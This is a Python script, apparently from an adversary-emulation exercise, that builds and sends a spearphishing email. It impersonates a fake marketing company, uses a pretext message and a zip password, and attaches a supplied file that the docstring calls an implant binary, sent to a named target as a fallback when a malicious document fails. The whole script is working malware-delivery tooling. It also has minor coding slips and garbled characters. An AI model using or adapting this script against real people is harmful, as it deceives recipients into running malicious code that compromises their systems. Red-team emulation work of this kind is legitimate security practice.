#!/usr/bin/python3

"""
Generate a backup spearphishing email to gosta@boom.box from team@ganjavigms.com, in the event that the original maldoc fails to execute or gets blocked.
The generated email will contain the specified attachment (e.g. implant binary or zip archive) rather than the spearphishing link from the original email.

Based on the email generator script created by Val Valenzuela and Melanie Chan.

Other references:
	- https://stackoverflow.com/a/3363254

Usage: ./backup_email_generator.py [SMTP server] [/path/to/attachment] [filename_to_send_as]
"""

import smtplib
import sys
from smtplib import SMTPException
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage

html = """\
<html>
    <body>
        <p style="margin:0">Good morning,<br><br>
           Per our earlier meeting with your team, please open the attached ZIP archive to find an overview of Ganjavi Global Marketing Services (GGMS) and how it can help the companyâ€™s digital marketing and public relations needs.<br><br>
            
           In order to view the documents, please enter password: !M@rk3ting!<br><br>
            
           Please let us know if you have any questions or concerns!<br><br>
            
           V/R,<br><br>
            
           The Team at GGMS
           <p style="color:#B0BDCB; margin:0; font-size:12px"><b>Ganjavi Global Marketing Services (GGMS)</b><br>
           <i>Providing top-tier marketing services since 1990</i></p>

           <img style="width:100px; height:86px" src="data:image/png;base64, " alt="GGMS Logo">
        </p>
    </body>
</html>
"""

def usage():
	print('./backup_email_generator.py [SMTP server] [/path/to/attachment] [filename_to_send_as]')

def main(argv):
	if len(argv) < 2:
		usage()
		sys.exit(1)
	smtp_server = argv[0]
	attachment_path = argv[1]
	attachment_name = argv[2]
	sender = 'team@ganjavigms.com'
	receivers = ['gosta@boom.box']
	message = MIMEMultipart('alternative')
	message['Subject'] = 'Requested Marketing Materials'
	message['From'] = 'team@ganjavigms.com'
	message['To'] = 'gosta@boom.box'

	
	message.attach(MIMEText(html, 'html'))
	
	with open(attachment_path, "rb") as to_attach:
		attachment_part = MIMEApplication(to_attach.read(), Name=attachment_name)
	attachment_part['Content-Disposition'] = 'attachment; filename="%s"' % attachment_name
	message.attach(attachment_part)

	try:
		smtpObj = smtplib.SMTP(smtp_server)
		smtpObj.sendmail(sender, receivers, message.as_string())
		print("Successfully sent email")
	except SMTPException as e:
		print("Error: unable to send email: " + e)
    
    
if __name__ == "__main__":
	main(sys.argv[1:])
